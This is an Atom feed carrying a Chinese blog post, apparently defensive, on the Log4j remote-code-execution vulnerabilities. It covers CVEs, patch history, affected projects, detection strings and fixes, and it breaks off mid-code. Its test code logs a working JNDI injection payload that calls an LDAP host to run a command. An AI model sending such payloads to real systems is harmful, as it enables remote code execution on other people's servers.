<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wuhaocn</title>
  
  
  <link href="https://wuhaocn.github.io/atom.xml" rel="self"/>
  
  <link href="https://wuhaocn.github.io/"/>
  <updated>2021-12-31T08:13:15.770Z</updated>
  <id>https://wuhaocn.github.io/</id>
  
  <author>
    <name>wuhao</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>log4j漏洞介绍及防护</title>
    <link href="https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/"/>
    <id>https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/</id>
    <published>2021-12-17T07:59:58.675Z</published>
    <updated>2021-12-31T08:13:15.770Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-45105  CVE-2021-45046  CVE-2021-44832  CVE-2021-44228</p><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>   Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。<br>   CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的  Log4j  版本。受影响的    Log4j 版本包含 Java 命名和目录接口  (JNDI) 功能，<br>   可以执行如消息查找替换等操作，攻击者可以通过向易受攻击的系统提交特制的请求，从而完全控制系统，远程执行任意代码，然后进行窃取信息、启动勒索软件或其他恶意活动。<br><strong>Apache Log4j2 安全补丁更新过程</strong></p><ul><li>2021-12-27 发布版本 2.17.1 <ul><li>当前安全版本</li></ul></li><li>2021-12-18 发布版本 2.17.0 <ul><li>直接漏洞(CVE-2021-44832)</li></ul></li><li>2021-12-13 发布版本 2.16.0 <ul><li>直接漏洞(CVE-2021-45105   CVE-2021-44832)</li></ul></li><li>2021-12-10 发布版本 2.15.0 <ul><li>直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832)</li></ul></li><li>2021-12-10 发布版本 2.14.1(严重漏洞) <ul><li>直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832   CVE-2021-44228)</li></ul></li><li>2017-09-18 发布版本 2.9.1(严重漏洞) <ul><li>直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832   CVE-2021-44228)(无法通过缓解方案解决)</li></ul></li></ul><h3 id="1-1-官方说明"><a href="#1-1-官方说明" class="headerlink" title="1.1 官方说明"></a>1.1 官方说明</h3><ul><li><p><a href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a><strong>（Log4j2 初始漏洞）</strong></p><p>   Apache Log4j 2 2.0-beta9 到 2.12.1 和 2.13.0 到 2.15.0 版本的 JNDI 功能在配置、日志消息和参数中使用，无法防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。从版本 2.16.0 开始，此功能已完全删除。请注意，此漏洞特定于 log4j-core，不会影响 log4net、log4cxx 或其他 Apache 日志服务项目。</p></li><li><p><a href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046">CVE-2021-45046</a><strong>（Log4j 2.15.0 未完整修复的漏洞）</strong></p><p>   Apache Log4j 2.15.0 中针对 CVE-2021-44228 的修复在某些非默认配置中不完整。当日志配置使用非默认模式布局和上下文查找（例如，$${ctx:loginId}）或线程上下文映射模式（ %X、%mdc 或 %MDC）使用 JNDI 查找模式制作恶意输入数据，从而导致拒绝服务 (DOS) 攻击。默认情况下，Log4j 2.15.0 尽最大努力将 JNDI LDAP 查找限制为 localhost。Log4j 2.16.0 通过删除对消息查找模式的支持和默认禁用 JNDI 功能来修复此问题。</p></li><li><p><a href="https://www.oschina.net/action/GoToLink?url=https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4104">CVE-2021-4104</a><strong>（Log4j 1.2 版本问题）</strong></p><p>  当攻击者对 Log4j 配置具有写访问权限时，Log4j 1.2 中的 JMSAppender 容易受到不可信数据的反序列化。攻击者可以提供 TopicBindingName 和 TopicConnectionFactoryBindingName 配置，导致 JMSAppender 以类似于 CVE-2021-44228 的方式执行 JNDI 请求，从而导致远程代码执行。<br>注意， JMSAppender 不是 Log4j 的默认配置，因此此漏洞<strong>仅在特别配置为 JMSAppender 时才会影响 Log4j 1.2</strong>。事实上 Apache Log4j 1.2 已于 2015 年 8 月终止生命周期。用户应该升级到Log4j 2，因为它解决了以前版本的许多其他问题。<br>​</p></li></ul><h3 id="1-2-开源组织"><a href="#1-2-开源组织" class="headerlink" title="1.2 开源组织"></a>1.2 开源组织</h3><ul><li><strong>已修复/更新：</strong><ul><li><strong>Metabase</strong> ：<a href="https://www.oschina.net/news/173590/metabase-0-41-4-released">v0.41.4 发布，解决 log4j2 漏洞问题</a></li><li><strong>openEuler</strong>：<a href="https://my.oschina.net/openeuler/blog/5359350">欧拉开源社区 Log4j 高危安全漏洞修复完成</a></li><li><strong>KubeSphere：</strong><a href="https://my.oschina.net/u/4197945/blog/5370085">Apache Log4j 2 远程代码执行最新漏洞的修复方案</a></li><li>**MateCloud **：<a href="https://www.oschina.net/news/173821">4.2.8 正式版发布，修复 Log4j2 的安全漏洞</a></li><li>**openLooKeng **开源社区： <a href="https://www.oschina.net/news/173802/openlookeng-log4j2-fix">Apache Log4j2 高危安全漏洞修复完成</a></li><li><strong>JPress</strong> 博客系统：<a href="https://www.oschina.net/news/172952/jpress-4-2-0-released">发布新版，修复 Log4j 漏洞问题</a></li><li><strong>Netty</strong> ：<a href="https://www.oschina.net/action/GoToLink?url=https://tower.im/teams/779130/todos/11874/Netty%25204.1.72.Final%2520%25E5%258F%2591%25E5%25B8%2583%25EF%25BC%258C%25E6%259B%25B4%25E6%2596%25B0%2520Log4j2%2520%25E7%2589%2588%25E6%259C%25AC">4.1.72.Final 发布，更新 Log4j2 版本</a></li><li><strong>Apache NiFi</strong> ：<a href="https://www.oschina.net/news/173940/apache-nifi-1-5-1-released">1.5.1 紧急发布，修复 log4j2 相关问题</a></li><li><strong>Jedis</strong> ：<a href="https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released">3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题</a></li><li>**Eurynome Cloud **： <a href="https://www.oschina.net/news/173440/eurynome-cloud-2-6-2-10-released">v2.6.2.10 发布，修复 Apache Log4j2 安全问题</a></li><li><strong>Jedis</strong>： <a href="https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released">3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题</a></li><li>**Apache Solr **：<a href="https://www.oschina.net/action/GoToLink?url=https://solr.apache.org/security.html%23apache-solr-affected-by-apache-log4j-cve-2021-44228">发布漏洞影响情况和缓解措施</a></li><li><strong>Minecraft ：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition">发布漏洞声明和缓解方案</a></li><li><strong>Apache Flink</strong> ：<a href="https://www.oschina.net/action/GoToLink?url=https://flink.apache.org/2021/12/10/log4j-cve.html">关于 Apache Log4j 零日 (CVE-2021-44228) 的建议</a></li><li><strong>Apache Druid</strong>：<a href="https://www.oschina.net/action/GoToLink?url=https://lists.apache.org/thread/r5pf1vf0758cv4pszcz61pbk34kw02y4">建议所有用户升级到 Druid 0.22.1</a></li><li><strong>OpenSearch：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://opensearch.org/blog/releases/2021/12/update-to-1-2-1/">重要提示：更新到 OpenSearch 1.2.1</a></li><li><strong>OpenNMS：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/">受 Apache Log4j 漏洞影响的 OpenNMS 产品</a></li><li><strong>IBM Cúram</strong> ：<a href="https://www.oschina.net/action/GoToLink?url=https://www.ibm.com/blogs/psirt/security-bulletin-vulnerability-in-apache-log4j-may-affect-cram-social-program-management-cve-2019-17571/">可能会影响 Cúram Social Program</a></li><li><strong>IBM WebSphere：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://www.ibm.com/blogs/psirt/security-bulletin-vulnerability-in-apache-log4j-affects-websphere-application-server-cve-2021-44228/">受影响，已更新</a></li></ul></li><li><strong>不受影响：</strong><ul><li><strong>Anolis OS</strong>：<a href="https://my.oschina.net/u/5265430/blog/5361164">不受 Log4j 高危安全漏洞影响</a></li><li>**SUSE **：<a href="https://www.oschina.net/action/GoToLink?url=https://www.suse.com/c/suse-statement-on-log4j-log4shell-cve-2021-44228-vulnerability/">产品均不受影响</a></li><li><strong>Apache Spark</strong>：<a href="https://www.oschina.net/action/GoToLink?url=https://issues.apache.org/jira/browse/SPARK-37630">不受影响</a></li><li>**Curl / Libcurl **：<a href="https://www.oschina.net/action/GoToLink?url=https://twitter.com/bagder/status/1470879113116360706">不受影响</a></li><li>**Zabbix **：<a href="https://www.oschina.net/action/GoToLink?url=https://blog.zabbix.com/zabbix-not-affected-by-the-log4j-exploit/17873/">不受影响</a></li><li>**DBeaver **：<a href="https://www.oschina.net/action/GoToLink?url=https://dbeaver.io/2021/12/15/log4shell-vulnerability-is-not-dangerous-for-dbeaver-users/">Log4j2 漏洞对我们的用户不危险</a></li><li><strong>VideoLAN：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://www.videolan.org/news.html%23news-2021-12-15">核心已移植到 Kotlin ，不用 Log4j</a></li><li><strong>Cloudflare：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://blog.cloudflare.com/zh-cn/how-cloudflare-security-responded-to-log4j2-vulnerability-zh-cn/">Cloudflare 如何安全应对 Log4j 2 漏洞</a></li><li><strong>LastPass：</strong><a href="https://www.oschina.net/action/GoToLink?url=https://support.logmeininc.com/lastpass/help/log4j-vulnerability-faq-for-lastpass-universal-proxy">不受影响</a></li><li><strong>HackerOne</strong>：<a href="https://www.oschina.net/action/GoToLink?url=https://twitter.com/jobertabma/status/1469490881854013444">不受影响，能利用漏洞影响 H1 的人可获得 25000 美金奖励</a></li></ul></li><li>​<strong>发布漏洞相关工具</strong><ul><li><strong>360CERT</strong>：<a href="https://my.oschina.net/u/4600927/blog/5371617">发布Log4j2恶意荷载批量检测调查工具</a></li><li><strong>腾讯容器安全</strong>：<a href="https://www.oschina.net/news/173667">发布开源 Log4j2 漏洞缓解工具</a></li></ul></li></ul><h2 id="2-初始漏洞说明"><a href="#2-初始漏洞说明" class="headerlink" title="2.初始漏洞说明"></a>2.初始漏洞说明</h2><ul><li> 影响范围<br>Apache Log4j 2.x &lt;= 2.15.0-rc1<br>受影响的应用及组件（包括但不限于）如下： Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2等。 </li><li> 攻击检测<br>可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。<br>检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 </li></ul><h2 id="3-检测代码"><a href="#3-检测代码" class="headerlink" title="3.检测代码"></a>3.检测代码</h2><ul><li>示例代码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Log4jErrorTest &#123;</span><br><span class="line"></span><br><span class="line">    private static final Logger logger = LogManager.getLogger(Log4jErrorTest.class);</span><br><span class="line">    @Test</span><br><span class="line">    void testLog4jError() throws InterruptedException &#123;</span><br><span class="line">        // -Dlog4j2.formatMsgNoLookups=true jvm参数修复</span><br><span class="line">        final boolean[] sign = &#123;false&#125;;</span><br><span class="line">        Thread thread = new Thread(new Runnable() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                logger.error(&quot;$&#123;jndi:ldap://192.168.1.20:1389/Basic/Command/calc&#125;&quot;);</span><br><span class="line">                sign[0] = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        thread.start();</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(500);</span><br><span class="line">        &#125; catch (Exception e)&#123;</span><br><span class="line">            Assertions.assertEquals(true, sign[0]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Assertions.assertEquals(true, sign[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-修正策略"><a href="#4-修正策略" class="headerlink" title="4.修正策略"></a>4.修正策略</h2><ul><li>升级版本log版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log4j_version=2.16.0</span><br><span class="line"></span><br><span class="line">log4j2.15版本未完全解决</span><br></pre></td></tr></table></figure></li></ul><ul><li>添加jvm参数启动参数<ul><li>log4j版本大于2.10才可用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Dlog4j2.formatMsgNoLookups=true</span><br><span class="line"></span><br><span class="line">//启动配置：log4j2.formatMsgNoLookups=True，不建议，不如升级版本</span><br><span class="line">//设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>其他修正 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">禁止不必要的业务访问外网这个也不建议，影响业务线程阻塞</span><br><span class="line">采用 rasp 对lookup的调用进行阻断</span><br><span class="line">采用waf对请求流量中的$&#123;jndi进行拦截</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="5-漏洞片段"><a href="#5-漏洞片段" class="headerlink" title="5.漏洞片段"></a>5.漏洞片段</h2><h3 id="5-1-漏洞堆栈"><a href="#5-1-漏洞堆栈" class="headerlink" title="5.1 漏洞堆栈"></a>5.1 漏洞堆栈</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&quot;main&quot; #1 prio=5 os_prio=31 tid=0x00007fc01e807000 nid=0x2703 runnable [0x000070000b944000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line">at java.net.PlainSocketImpl.socketConnect(Native Method)</span><br><span class="line">at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)</span><br><span class="line">- locked &lt;0x0000000796c8d0d0&gt; (a java.net.SocksSocketImpl)</span><br><span class="line">at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)</span><br><span class="line">at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)</span><br><span class="line">at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)</span><br><span class="line">at java.net.Socket.connect(Socket.java:606)</span><br><span class="line">at java.net.Socket.connect(Socket.java:555)</span><br><span class="line">at java.net.Socket.&lt;init&gt;(Socket.java:451)</span><br><span class="line">at java.net.Socket.&lt;init&gt;(Socket.java:228)</span><br><span class="line">at com.sun.jndi.ldap.Connection.createSocket(Connection.java:375)</span><br><span class="line">at com.sun.jndi.ldap.Connection.&lt;init&gt;(Connection.java:215)</span><br><span class="line">at com.sun.jndi.ldap.LdapClient.&lt;init&gt;(LdapClient.java:137)</span><br><span class="line">at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609)</span><br><span class="line">at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)</span><br><span class="line">at com.sun.jndi.ldap.LdapCtx.&lt;init&gt;(LdapCtx.java:319)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)</span><br><span class="line">at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)</span><br><span class="line">at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)</span><br><span class="line">at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)</span><br><span class="line">at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)</span><br><span class="line">at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)</span><br><span class="line">at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)</span><br><span class="line">at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)</span><br><span class="line">at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)</span><br><span class="line">at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)</span><br><span class="line">at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)</span><br><span class="line">at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)</span><br><span class="line">at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)</span><br><span class="line">at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)</span><br><span class="line">at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)</span><br><span class="line">at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)</span><br><span class="line">at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)</span><br><span class="line">at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)</span><br><span class="line">at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)</span><br><span class="line">at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)</span><br><span class="line">at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)</span><br><span class="line">at org.apache.logging.log4j.core.Logger.log(Logger.java:161)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)</span><br><span class="line">at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)</span><br><span class="line">at log4jRCE.main(log4jRCE.java:16)</span><br></pre></td></tr></table></figure><h3 id="5-2-修正策略"><a href="#5-2-修正策略" class="headerlink" title="5.2 修正策略"></a>5.2 修正策略</h3><ul><li>以2.16.0为例<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jndi关闭策略</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isJndiEnabled</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.enableJndi&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭策略</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> JndiManager <span class="title">createManager</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> Properties data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isJndiEnabled()) &#123;  <span class="comment">// 2021/12/13 修正</span></span><br><span class="line">        String hosts = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_HOSTS) : <span class="keyword">null</span>;</span><br><span class="line">        String classes = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_CLASSES) : <span class="keyword">null</span>;</span><br><span class="line">        String protocols = data != <span class="keyword">null</span> ? data.getProperty(ALLOWED_PROTOCOLS) : <span class="keyword">null</span>;</span><br><span class="line">        List&lt;String&gt; allowedHosts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; allowedClasses = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        List&lt;String&gt; allowedProtocols = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data);</span><br><span class="line">        addAll(classes, allowedClasses, permanentAllowedClasses, ALLOWED_CLASSES, data);</span><br><span class="line">        addAll(protocols, allowedProtocols, permanentAllowedProtocols, ALLOWED_PROTOCOLS, data);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> JndiManager(name, <span class="keyword">new</span> InitialDirContext(data), allowedHosts, allowedClasses,</span><br><span class="line">                                   allowedProtocols);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">&quot;Error creating JNDI InitialContext.&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JndiManager(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; <span class="function">T <span class="title">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;  <span class="comment">//2021/12/12 修正</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        URI uri = <span class="keyword">new</span> URI(name);</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">        LOGGER.warn(<span class="string">&quot;Invalid JNDI URI - &#123;&#125;&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2021/12/12</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">JndiManager</span><span class="params">(<span class="keyword">final</span> String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="keyword">null</span>, name);</span><br><span class="line">    <span class="keyword">this</span>.context = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedProtocols = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedClasses = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.allowedHosts = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2021/12/12 修正</span></span><br><span class="line"><span class="keyword">if</span> (JndiManager.isJndiEnabled()) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JmsManager(name, data);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">        logger().error(<span class="string">&quot;Error creating JmsManager using JmsManagerConfiguration [&#123;&#125;]&quot;</span>, data, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    logger().error(<span class="string">&quot;JNDI has not been enabled. The log4j2.enableJndi property must be set to true&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> Map.Entry&lt;String, PluginType&lt;?&gt;&gt; entry : plugins.entrySet()) &#123;</span><br><span class="line">    <span class="keyword">try</span> 